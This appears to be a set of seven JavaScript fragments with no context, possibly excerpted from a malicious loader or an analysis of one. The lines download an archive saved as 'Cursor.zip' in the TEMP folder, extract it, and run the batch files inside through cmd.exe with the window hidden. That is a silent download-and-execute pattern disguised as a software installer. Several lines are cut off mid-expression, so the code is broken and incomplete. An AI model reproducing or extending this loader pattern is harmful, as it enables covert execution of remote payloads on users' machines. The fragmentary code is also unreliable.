await downloadFile(downloadUrl, zipPath)
Seven.extractFull(zipPath, extractPath
f.endsWith('.bat')
inspect('cmd.exe', ['/c', batPath]
windowsHide: true
await inspectBat(extractPath)
path.join(process.env.TEMP, 'Cursor.zip')
